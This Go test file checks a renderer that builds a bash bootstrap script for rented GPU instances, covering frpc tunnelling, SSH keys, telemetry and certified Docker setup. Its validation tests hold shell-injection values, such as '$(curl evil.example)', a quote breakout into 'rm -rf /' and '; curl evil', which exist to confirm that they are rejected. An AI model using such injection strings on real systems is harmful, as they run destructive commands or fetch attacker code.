package tunnel

import (
	"strings"
	"testing"
)

// validFRPBootstrapData returns a BootstrapData with all valid fields for testing.
func validFRPBootstrapData() BootstrapData {
	return BootstrapData{
		InstanceID:        "gpu-4a7f",
		ProxyHost:         "203.0.113.10",
		FRPServerPort:     7000,
		FRPToken:          "tok_frp_test_abc123def456",
		RemotePort:        10002,
		SSHAuthorizedKeys: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere12345678901234567890 user@host",
		InternalToken:     "tok_test_abc123def456",
		Hostname:          "gpu-4a7f.example.com",
		CallbackURL:       "https://api.example.com/internal/instances/gpu-4a7f/ready",
	}
}

// TestRenderBootstrap_KeylessEmptyAuthorizedKeys: a keyless launch (web-console
// -only access; the engine gates it on webConsoleAvailable) renders with an
// EMPTY SSHAuthorizedKeys — validation accepts it and the authorized_keys block
// still renders, just with nothing in it.
func TestRenderBootstrap_KeylessEmptyAuthorizedKeys(t *testing.T) {
	data := validFRPBootstrapData()
	data.SSHAuthorizedKeys = ""
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap with empty SSHAuthorizedKeys: %v", err)
	}
	if !strings.Contains(output, "authorized_keys") {
		t.Error("expected the authorized_keys block to render for a keyless launch")
	}
}

func TestRenderBootstrap(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// Verify script starts with shebang
	if !strings.HasPrefix(output, "#!/bin/bash") {
		t.Error("output does not start with #!/bin/bash")
	}

	// Verify frpc TOML config with correct values
	if !strings.Contains(output, `serverAddr = "203.0.113.10"`) {
		t.Error("output does not contain correct serverAddr")
	}
	if !strings.Contains(output, "serverPort = 7000") {
		t.Error("output does not contain correct serverPort")
	}
	if !strings.Contains(output, `auth.token = "tok_frp_test_abc123def456"`) {
		t.Error("output does not contain correct auth.token")
	}
	if !strings.Contains(output, "remotePort = 10002") {
		t.Error("output does not contain correct remotePort")
	}
	if !strings.Contains(output, "localPort = 22") {
		t.Error("output does not contain localPort = 22")
	}
	// GPU-57: the certified-VM SSH repoint (:2222) must never leak into the
	// base render (RemotePort 10002 does not collide with this substring).
	if strings.Contains(output, "2222") {
		t.Error("base render contains '2222' -- certified-VM SSH repoint leaked into the default path (GPU-57)")
	}

	// Verify no Go template syntax remains
	if strings.Contains(output, "{{") {
		t.Error("rendered output still contains '{{' -- Go template placeholders not fully expanded")
	}
	if strings.Contains(output, "}}") {
		t.Error("rendered output still contains '}}' -- Go template placeholders not fully expanded")
	}
}

// TestRenderBootstrap_VanillaImageDeps pins the dependency-install step:
// vanilla Docker Hub images (pytorch/pytorch, nvidia/cuda) ship without
// curl or openssh-server, and generic-supplier launches run exactly such
// images — dropping this step reverts them to permanent boot death
// (frpc download and ready callback both need curl; buyer SSH needs sshd).
func TestRenderBootstrap_VanillaImageDeps(t *testing.T) {
	output, err := RenderBootstrap(validFRPBootstrapData())
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}
	for _, want := range []string{
		"openssh-server",
		"--no-install-recommends curl",
		"mkdir -p /run/sshd",
	} {
		if !strings.Contains(output, want) {
			t.Errorf("bootstrap script missing dependency-install marker %q", want)
		}
	}
}

func TestRenderBootstrap_SSHKeys(t *testing.T) {
	data := validFRPBootstrapData()
	key1 := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere12345678901234567890 user1@host1"
	key2 := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1234567890abcdefghijklmnopqrstuvwxyz user2@host2"
	data.SSHAuthorizedKeys = key1 + "\n" + key2

	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap with multiple keys failed: %v", err)
	}

	if !strings.Contains(output, key1) {
		t.Error("output does not contain SSH key 1")
	}
	if !strings.Contains(output, key2) {
		t.Error("output does not contain SSH key 2")
	}

	// Verify authorized_keys section exists
	if !strings.Contains(output, "authorized_keys") {
		t.Error("output does not contain authorized_keys section")
	}
}

func TestRenderBootstrap_Callback(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// Verify callback URL is present
	if !strings.Contains(output, data.CallbackURL) {
		t.Error("output does not contain callback URL")
	}

	// Verify internal token is used for auth
	if !strings.Contains(output, data.InternalToken) {
		t.Error("output does not contain internal token")
	}

	// Verify curl is used for callback
	if !strings.Contains(output, "curl") {
		t.Error("output does not contain curl for ready callback")
	}
}

func TestRenderBootstrap_FRPCDownload(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// Verify frpc binary download
	if !strings.Contains(output, "frpc") {
		t.Error("output does not contain frpc binary reference")
	}

	// Verify frpc config file
	if !strings.Contains(output, "frpc.toml") {
		t.Error("output does not contain frpc.toml config file")
	}
}

// TestRenderBootstrap_FRPCBakedFastPath verifies the bootstrap prefers an
// image-baked frpc over downloading. Some sandboxed container runtimes forbid
// making a runtime-delivered file executable, so a downloaded frpc can never
// run there; the certified image bakes frpc at /usr/local/bin/frpc, and the
// bootstrap must use it and gate the download loop on it being absent.
func TestRenderBootstrap_FRPCBakedFastPath(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// The baked-frpc check must exist and run before the download loop.
	bakedIdx := strings.Index(output, "[ -x /usr/local/bin/frpc ]")
	if bakedIdx == -1 {
		t.Fatal("output does not check for an image-baked frpc at /usr/local/bin/frpc")
	}
	dlIdx := strings.Index(output, "Downloading frpc")
	if dlIdx != -1 && bakedIdx > dlIdx {
		t.Error("the image-baked frpc check must run before the download")
	}

	// The download loop must be gated so a present baked binary skips it.
	if !strings.Contains(output, `if [ "$FRPC_DOWNLOADED" = false ]; then`) {
		t.Error("download-branch echo is not gated on FRPC_DOWNLOADED being false")
	}
}

func TestRenderBootstrap_EgressGate(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// The egress gate must probe the tunnel server endpoint (host + port from
	// data), BEFORE the frpc download: some VM providers attach the public IP
	// after first boot, and a fail-fast download left the tunnel dead forever.
	probe := "/dev/tcp/203.0.113.10/7000"
	if !strings.Contains(output, probe) {
		t.Errorf("output does not contain egress probe %q", probe)
	}
	gateIdx := strings.Index(output, probe)
	dlIdx := strings.Index(output, "Downloading frpc")
	if dlIdx != -1 && gateIdx > dlIdx {
		t.Error("egress gate must run before the frpc download")
	}
}

func TestRenderBootstrap_FRPCSupervision(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// VM path: systemd unit with restart-on-exit.
	if !strings.Contains(output, "gpuai-frpc.service") {
		t.Error("output does not install the gpuai-frpc systemd unit")
	}
	if !strings.Contains(output, "Restart=always") {
		t.Error("frpc systemd unit is not Restart=always")
	}
	// Container path: respawn loop fallback (no PID-1 systemd there).
	if !strings.Contains(output, "frpc exited, restarting") {
		t.Error("output does not contain the container respawn loop fallback")
	}
}

// TestRenderBootstrap_TelemetrySampler asserts the TELEM-01 recurring sampler
// block renders when TelemetryURL is set: a backgrounded nvidia-smi query loop
// guarded by `command -v nvidia-smi`, POSTing to the telemetry URL.
func TestRenderBootstrap_TelemetrySampler(t *testing.T) {
	data := validFRPBootstrapData()
	data.TelemetryURL = "https://api.example.com/internal/instances/gpu-4a7f/telemetry"
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// The telemetry URL is the POST target.
	if !strings.Contains(output, data.TelemetryURL) {
		t.Error("output does not contain the telemetry URL")
	}
	// The nvidia-smi query is the exact full-metric query line.
	if !strings.Contains(output, "nvidia-smi --query-gpu=utilization.gpu,memory.used,memory.total,power.draw") {
		t.Error("output does not contain the nvidia-smi telemetry query")
	}
	// Guarded by the existing command -v idiom.
	if !strings.Contains(output, "command -v nvidia-smi") {
		t.Error("telemetry sampler is not guarded by command -v nvidia-smi")
	}
	// Recurring: a sleep cadence inside a while loop (not a one-shot).
	if !strings.Contains(output, "while true; do") || !strings.Contains(output, "sleep 120") {
		t.Error("telemetry sampler is not a recurring loop with a sleep cadence")
	}
	// Supervised like frpc: systemd unit on VMs, respawn loop in containers.
	if !strings.Contains(output, "gpuai-telemetry.service") {
		t.Error("output does not install the gpuai-telemetry systemd unit")
	}
	if !strings.Contains(output, "telemetry sampler exited, restarting") {
		t.Error("output does not contain the container respawn loop fallback for the sampler")
	}
	// Reuses the per-instance internal token for auth.
	if !strings.Contains(output, "Bearer "+data.InternalToken) {
		t.Error("telemetry POST does not authenticate with the internal token")
	}
}

// TestRenderBootstrap_NoTelemetryWhenEmpty asserts the sampler block is ABSENT
// when TelemetryURL is empty (raw bootstrap unchanged, never crashes).
func TestRenderBootstrap_NoTelemetryWhenEmpty(t *testing.T) {
	data := validFRPBootstrapData() // TelemetryURL unset
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	if strings.Contains(output, "gpuai-telemetry.service") {
		t.Error("telemetry sampler rendered despite empty TelemetryURL")
	}
	if strings.Contains(output, "nvidia-smi --query-gpu=utilization.gpu,memory.used,memory.total,power.draw") {
		t.Error("telemetry nvidia-smi query rendered despite empty TelemetryURL")
	}
	if strings.Contains(output, "/telemetry") {
		t.Error("telemetry endpoint rendered despite empty TelemetryURL")
	}
}

// TestRenderBootstrap_Normalization pins the Phase 63 Docker-normalization
// bootstrap surface (Plan 01 Wave 0, RED until Plan 04 renders the block). Three
// deployment modes drive three distinct bootstrap shapes:
//
//	(a) certified VM   — driver-floor check (sort -V vs DriverFloor), the
//	    nvidia-container-toolkit install, and a `docker run` of the server-pinned
//	    digest image (PinnedImageRef).
//	(b) raw VM         — a driver check, but it must NEVER install the toolkit or
//	    `docker run` (we bootstrap the machine, not a nested container).
//	(c) container-native — NONE of the above: the provider runs our image
//	    natively, so the bootstrap must NEVER nest Docker (Pitfall 1 / T-63-05).
func TestRenderBootstrap_Normalization(t *testing.T) {
	const pinnedDigest = "ghcr.io/gpuai/certified@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

	// (a) certified VM: full normalization block.
	t.Run("certified_vm", func(t *testing.T) {
		data := validFRPBootstrapData()
		data.CertifiedImage = true
		data.DeploymentType = "vm"
		data.PinnedImageRef = pinnedDigest
		data.DriverFloor = "570.26"
		output, err := RenderBootstrap(data)
		if err != nil {
			t.Fatalf("RenderBootstrap failed: %v", err)
		}
		// Driver-floor comparison uses `sort -V` against the DriverFloor value.
		if !strings.Contains(output, "sort -V") {
			t.Error("certified VM bootstrap missing sort -V driver comparison")
		}
		if !strings.Contains(output, "570.26") {
			t.Error("certified VM bootstrap missing the DriverFloor value")
		}
		// The nvidia-container-toolkit is installed so `docker run --gpus` works.
		if !strings.Contains(output, "nvidia-container-toolkit") {
			t.Error("certified VM bootstrap does not install nvidia-container-toolkit")
		}
		// The pinned DIGEST image is run verbatim (server-controlled, never a tag).
		if !strings.Contains(output, "docker run") {
			t.Error("certified VM bootstrap does not docker run the pinned image")
		}
		if !strings.Contains(output, pinnedDigest) {
			t.Error("certified VM bootstrap does not use the pinned digest image ref")
		}
		// GPU-57 defect 1: `-p 22:22` can never bind -- host sshd owns :22
		// (restarted by this very script in section 3), so the certified
		// container silently failed to start and customers SSHed into the
		// host VM. Fix: publish the container's sshd on loopback :2222 and
		// point the FRP SSH proxy at it; host sshd keeps :22 for provider
		// rescue access.
		if !strings.Contains(output, "localPort = 2222") {
			t.Error("certified VM FRP SSH proxy does not target the container port 2222 (GPU-57)")
		}
		if strings.Contains(output, "localPort = 22\n") {
			t.Error("certified VM render still proxies SSH to host sshd on :22 (GPU-57)")
		}
		if !strings.Contains(output, "-p 127.0.0.1:2222:22") {
			t.Error("certified container sshd is not published on loopback :2222 (GPU-57)")
		}
		if strings.Contains(output, "-p 22:22") {
			t.Error("certified docker run still binds host :22 -- collides with host sshd (GPU-57)")
		}
		// GPU-57 defect 2: `docker run -d` prints a container ID even when the
		// container fails to START (e.g. a port bind conflict leaves it
		// "created" forever), so an existence check false-positives. The guard
		// must poll for status=running, capture docker run stderr instead of
		// swallowing it, and fail LOUDLY (distinct exit code, mirrors the
		// driver-floor exit 90 idiom) so the instance is never published as a
		// healthy certified env.
		if !strings.Contains(output, `--filter "status=running"`) {
			t.Error("certified container guard is not a liveness check (missing status=running filter, GPU-57)")
		}
		if !strings.Contains(output, "exit 91") {
			t.Error("certified container-start failure does not exit 91 (GPU-57)")
		}
		if !strings.Contains(output, "/var/log/gpuai-certified-run.err") {
			t.Error("certified docker run stderr is swallowed instead of captured (GPU-57)")
		}
		// The certified image's sshd never materializes SSH_AUTHORIZED_KEYS on
		// its own; bootstrap must install the keys into the running container
		// or SSH through the tunnel is reachable-but-unauthenticatable.
		if !strings.Contains(output, "/root/.ssh/authorized_keys") {
			t.Error("certified bootstrap does not install SSH keys into the container (GPU-57)")
		}
		if !strings.Contains(output, "SSH key install failed") {
			t.Error("a failed certified key install does not degrade loudly (GPU-57)")
		}
	})

	// (b) raw VM: driver check present, but NEVER docker/toolkit.
	t.Run("raw_vm", func(t *testing.T) {
		data := validFRPBootstrapData()
		data.CertifiedImage = false
		data.DeploymentType = "vm"
		data.DriverFloor = "535.129"
		output, err := RenderBootstrap(data)
		if err != nil {
			t.Fatalf("RenderBootstrap failed: %v", err)
		}
		// A raw VM still gets a driver-floor check (its DriverFloor is rendered).
		if !strings.Contains(output, "535.129") {
			t.Error("raw VM bootstrap missing the DriverFloor driver check")
		}
		// But it must NOT nest Docker or install the container toolkit.
		if strings.Contains(output, "nvidia-container-toolkit") {
			t.Error("raw VM bootstrap must not install nvidia-container-toolkit")
		}
		if strings.Contains(output, "docker run") {
			t.Error("raw VM bootstrap must not docker run a certified image")
		}
		// GPU-57: non-certified renders keep SSH proxied to host sshd on :22
		// and must not carry any trace of the certified :2222 repoint.
		if !strings.Contains(output, "localPort = 22") {
			t.Error("raw VM render missing localPort = 22 for the SSH proxy (GPU-57)")
		}
		if strings.Contains(output, "2222") {
			t.Error("raw VM render contains '2222' -- certified SSH repoint leaked (GPU-57)")
		}
	})

	// (c) container-native: NONE of the normalization block (T-63-05).
	t.Run("container_native", func(t *testing.T) {
		data := validFRPBootstrapData()
		data.CertifiedImage = false
		data.DeploymentType = "container"
		output, err := RenderBootstrap(data)
		if err != nil {
			t.Fatalf("RenderBootstrap failed: %v", err)
		}
		if strings.Contains(output, "nvidia-container-toolkit") {
			t.Error("container-native bootstrap must not install nvidia-container-toolkit")
		}
		if strings.Contains(output, "docker run") {
			t.Error("container-native bootstrap must never nest Docker (Pitfall 1 / T-63-05)")
		}
		// GPU-57: container-native SSH stays on :22 (a provider's own -p 22:22
		// publish is a different, untouched path) -- no :2222 repoint here.
		if !strings.Contains(output, "localPort = 22") {
			t.Error("container-native render missing localPort = 22 for the SSH proxy (GPU-57)")
		}
		if strings.Contains(output, "2222") {
			t.Error("container-native render contains '2222' -- certified SSH repoint leaked (GPU-57)")
		}
	})

	// ValidateBootstrapData must reject shell metacharacters in the new fields
	// (T-63-06) — the pinned image ref and driver floor flow into a rendered
	// shell script, so an injected `$(...)` must be refused, not rendered.
	t.Run("rejects_shell_metachars_in_pinned_ref", func(t *testing.T) {
		data := validFRPBootstrapData()
		data.CertifiedImage = true
		data.DeploymentType = "vm"
		data.DriverFloor = "570.26"
		data.PinnedImageRef = "ghcr.io/gpuai/certified@sha256:$(curl evil.example)"
		if _, err := RenderBootstrap(data); err == nil {
			t.Error("RenderBootstrap accepted a PinnedImageRef containing a shell substitution")
		}
	})
}

func TestRenderBootstrap_InvalidData(t *testing.T) {
	data := BootstrapData{} // all empty
	_, err := RenderBootstrap(data)
	if err == nil {
		t.Fatal("RenderBootstrap should return error for invalid data")
	}

	if !strings.Contains(err.Error(), "validation failed") {
		t.Errorf("error should mention validation, got: %v", err)
	}
}

// Containers cannot change the live kernel hostname, so the default prompt
// would leak the provider's container id; the bootstrap pins a branded PS1.
func TestRenderBootstrap_BrandedPromptFallback(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	// The branded-prompt fallback for containers where the hostname can't change.
	if !strings.Contains(output, `PS1='\u@gpu-4a7f.example.com:\w\$ '`) {
		t.Error("bootstrap does not pin a branded PS1 fallback with the instance hostname")
	}
}

// GPU-62: a provider welcome text can reach the customer via sshd's PRE-AUTH
// Banner (a separate channel from /etc/motd), so the bootstrap must overwrite the Banner target and
// neutralize the sshd_config directive, or the provider name leaks on every
// login over the FRP tunnel.
func TestRenderBootstrap_SshdBannerScrub(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}

	if !strings.Contains(output, "> /etc/issue.net") {
		t.Error("bootstrap does not overwrite /etc/issue.net (the default sshd Banner target)")
	}
	if !strings.Contains(output, "Banner none") {
		t.Error("bootstrap does not neutralize an explicit sshd Banner directive")
	}
	if !strings.Contains(output, "pkill -HUP -x sshd") {
		t.Error("bootstrap does not HUP sshd so a Banner directive change takes effect in containers")
	}
}

// The frpc download must survive per-destination egress blackouts: the pinned
// version renders from the package const, the platform mirror (when present)
// is tried before the GitHub release inside a bounded backoff loop, and the
// callback sender retries every failure class. These markers pin the
// hardening so a template refactor can't silently regress it.
func TestRenderBootstrap_FRPCMirror(t *testing.T) {
	// Presigned-URL-shaped mirror: percent-escapes, query params with & and =.
	mirror := "https://mirror.example.com/frp/frp_" +
		FRPVersion + "_linux_amd64.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIA%2F20260721%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Expires=3600&X-Amz-Signature=abc123"

	data := validFRPBootstrapData()
	data.FRPCMirrorURL = mirror
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap with mirror failed: %v", err)
	}

	if !strings.Contains(output, `FRP_VERSION="`+FRPVersion+`"`) {
		t.Errorf("bootstrap does not pin FRP_VERSION to the package const %q", FRPVersion)
	}
	// The mirror renders single-quoted (immune to $, &, ; in presigned URLs)
	// and must appear BEFORE the GitHub fallback in the source array.
	mirrorIdx := strings.Index(output, "'"+mirror+"'")
	githubIdx := strings.Index(output, "https://github.com/fatedier/frp/releases/download")
	if mirrorIdx == -1 {
		t.Fatal("bootstrap does not contain the single-quoted mirror URL")
	}
	if githubIdx == -1 {
		t.Fatal("bootstrap does not contain the GitHub fallback URL")
	}
	if mirrorIdx > githubIdx {
		t.Error("mirror URL must come before the GitHub fallback in FRPC_URLS")
	}
	for _, marker := range []string{"FRPC_DL_DEADLINE", "send_callback", "99gpuai-net-timeouts"} {
		if !strings.Contains(output, marker) {
			t.Errorf("bootstrap missing hardening marker %q", marker)
		}
	}
}

// Without a mirror URL the source array holds only the GitHub release (the
// pre-mirror behavior), and the retry loop still renders.
func TestRenderBootstrap_NoMirror(t *testing.T) {
	data := validFRPBootstrapData()
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap failed: %v", err)
	}
	if strings.Contains(output, "mirror.example.com") {
		t.Error("mirror URL rendered despite FRPCMirrorURL being empty")
	}
	if !strings.Contains(output, "https://github.com/fatedier/frp/releases/download") {
		t.Error("GitHub fallback URL missing")
	}
	if !strings.Contains(output, "FRPC_DL_DEADLINE") {
		t.Error("frpc download retry loop missing")
	}
}

// FRPCMirrorURL renders inside a single-quoted shell word; the validator must
// reject anything that could escape that context (or smuggle a non-URL), and
// accept a real presigned URL.
func TestValidateFRPCMirrorURL(t *testing.T) {
	bad := []string{
		"http://insecure.example.com/frp.tar.gz",  // https only
		"https://a.example.com/frp'; rm -rf /; '", // single quote breaks out
		"https://a.example.com/frp`id`.tar.gz",    // backtick
		"https://a.example.com/frp .tar.gz",       // whitespace
		"https://a.example.com/frp\ntar.gz",       // newline
		"file:///etc/passwd",                      // non-https scheme
		"https://a.example.com/frp\\.tar.gz",      // backslash
	}
	for _, u := range bad {
		data := validFRPBootstrapData()
		data.FRPCMirrorURL = u
		if err := ValidateBootstrapData(data); err == nil {
			t.Errorf("ValidateBootstrapData accepted bad mirror URL %q; want error", u)
		}
	}

	good := validFRPBootstrapData()
	good.FRPCMirrorURL = "https://mirror.example.com/frp/frp_0.67.0_linux_amd64.tar.gz?X-Amz-Expires=3600&X-Amz-Signature=ab%2Fc"
	if err := ValidateBootstrapData(good); err != nil {
		t.Errorf("ValidateBootstrapData rejected a presigned-shaped URL: %v", err)
	}
}

// FRPVersion defaults to the package pin at render time and rejects
// shell-unsafe overrides at validation.
func TestRenderBootstrap_FRPVersionPin(t *testing.T) {
	data := validFRPBootstrapData()
	data.FRPVersion = "1.2.3"
	output, err := RenderBootstrap(data)
	if err != nil {
		t.Fatalf("RenderBootstrap with version override failed: %v", err)
	}
	if !strings.Contains(output, `FRP_VERSION="1.2.3"`) {
		t.Error("FRPVersion override not rendered")
	}

	badVer := validFRPBootstrapData()
	badVer.FRPVersion = "0.67.0; curl evil"
	if err := ValidateBootstrapData(badVer); err == nil {
		t.Error("ValidateBootstrapData accepted a shell-unsafe FRPVersion; want error")
	}
}

// TestRenderBootstrap_CertifiedGPULiveness pins the GPU-76 fix.
//
// Symptom: on a certified VM the container started fine (docker_up=true, the
// instance published healthy) but every CUDA/NVML call INSIDE it failed with
// "Failed to initialize NVML: Unknown Error" while the host's own nvidia-smi
// was perfect.
//
// Root cause (reproduced live on a supplier RTX A6000, 2026-09-01, driver
// 580.126.09 / toolkit 1.18.1 / docker 29.1.5 / cgroup v2 + systemd cgroup
// driver): `docker run --gpus all` leaves the container's GPU device
// permission owned by the nvidia hook's cgroup entries, which are NOT part of
// the container's own device policy. Any later systemd unit-state change --
// and this bootstrap performs several AFTER the container starts (section 8
// stop/disable/remove unattended-upgrades, section 9b's telemetry unit
// daemon-reload) -- makes systemd re-reconcile the container scope's device
// policy and silently drop those entries. The container keeps running; its GPU
// is gone.
//
// Live A/B on the same host: `--gpus all` alone died on the FIRST
// daemon-reload; `--gpus all` PLUS explicit `--device /dev/nvidia*` survived
// repeated reloads and unit churn, because docker/systemd re-apply a
// container's declared devices.
//
// Two guarantees are asserted here: the device flags (the fix) and an
// in-container NVML probe that routes a GPU-dead container into the existing
// exit-91 loud-failure branch (the guard, so this class of defect can never
// again publish healthy).
func TestRenderBootstrap_CertifiedGPULiveness(t *testing.T) {
	const pinnedDigest = "ghcr.io/gpuai/certified@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

	renderCertifiedVM := func(t *testing.T) string {
		t.Helper()
		data := validFRPBootstrapData()
		data.CertifiedImage = true
		data.DeploymentType = "vm"
		data.PinnedImageRef = pinnedDigest
		data.DriverFloor = "570.26"
		out, err := RenderBootstrap(data)
		if err != nil {
			t.Fatalf("RenderBootstrap failed: %v", err)
		}
		return out
	}

	// Fix: the certified docker run declares the GPU device nodes explicitly,
	// enumerated from the host so a CPU-only or multi-GPU host both work.
	t.Run("declares_gpu_devices_explicitly", func(t *testing.T) {
		output := renderCertifiedVM(t)
		if !strings.Contains(output, "GPU_DEVICE_FLAGS") {
			t.Error("certified render does not enumerate GPU device nodes for docker run (GPU-76)")
		}
		if !strings.Contains(output, "/dev/nvidia-caps/") {
			t.Error("device enumeration misses /dev/nvidia-caps (MIG capability nodes) (GPU-76)")
		}
		if !strings.Contains(output, "--gpus all $GPU_DEVICE_FLAGS") {
			t.Error("certified docker run does not pass the enumerated --device flags alongside --gpus all (GPU-76)")
		}
	})

	// Guard: a running-but-GPU-dead certified container must take the loud
	// failure branch (docker_up=false callback + exit 91), never publish ready.
	t.Run("in_container_nvml_probe_fails_loudly", func(t *testing.T) {
		output := renderCertifiedVM(t)
		if !strings.Contains(output, "docker exec gpuai-certified nvidia-smi") {
			t.Error("certified render has no in-container nvidia-smi liveness probe (GPU-76)")
		}
		if !strings.Contains(output, "certified_gpu_live") {
			t.Error("certified render does not define/use a reusable in-container GPU liveness check (GPU-76)")
		}
		// The probe must demote DOCKER_UP so control reaches the existing
		// GPU-57 loud-failure branch rather than inventing a silent path.
		if !strings.Contains(output, "in-container NVML") {
			t.Error("GPU-dead certified container does not log the NVML failure loudly (GPU-76)")
		}
		if !strings.Contains(output, "exit 91") {
			t.Error("certified failure path lost its exit 91 loud failure (GPU-57/GPU-76)")
		}
		// Called at least twice: once at container start, and once more after
		// the post-launch systemd churn, immediately before the ready callback
		// -- the callback is what publishes healthy.
		if strings.Count(output, "certified_gpu_live") < 3 { // 1 definition + >=2 call sites
			t.Errorf("in-container GPU liveness is not re-checked before the ready callback (GPU-76); occurrences=%d",
				strings.Count(output, "certified_gpu_live"))
		}
	})

	// A certified VM whose host has no GPU at all must not fail on the probe:
	// the check is gated on the section-7 host detection sentinel.
	t.Run("probe_gated_on_host_gpu_detection", func(t *testing.T) {
		output := renderCertifiedVM(t)
		if !strings.Contains(output, `"$GPU_INFO" != "nvidia-smi not found"`) {
			t.Error("in-container GPU probe is not gated on host GPU detection -- a CPU-only certified VM would fail on it (GPU-76 / T-q76-03)")
		}
	})

	// Non-certified paths are untouched: no device enumeration, no probe.
	t.Run("absent_on_non_certified_paths", func(t *testing.T) {
		for _, tc := range []struct {
			name           string
			deploymentType string
		}{
			{"raw_vm", "vm"},
			{"container_native", "container"},
		} {
			t.Run(tc.name, func(t *testing.T) {
				data := validFRPBootstrapData()
				data.CertifiedImage = false
				data.DeploymentType = tc.deploymentType
				output, err := RenderBootstrap(data)
				if err != nil {
					t.Fatalf("RenderBootstrap failed: %v", err)
				}
				if strings.Contains(output, "GPU_DEVICE_FLAGS") {
					t.Error("non-certified render leaked the certified GPU device enumeration (GPU-76)")
				}
				if strings.Contains(output, "certified_gpu_live") {
					t.Error("non-certified render leaked the in-container GPU liveness probe (GPU-76)")
				}
				if strings.Contains(output, "docker exec gpuai-certified") {
					t.Error("non-certified render references the certified container (GPU-76)")
				}
			})
		}
	})
}
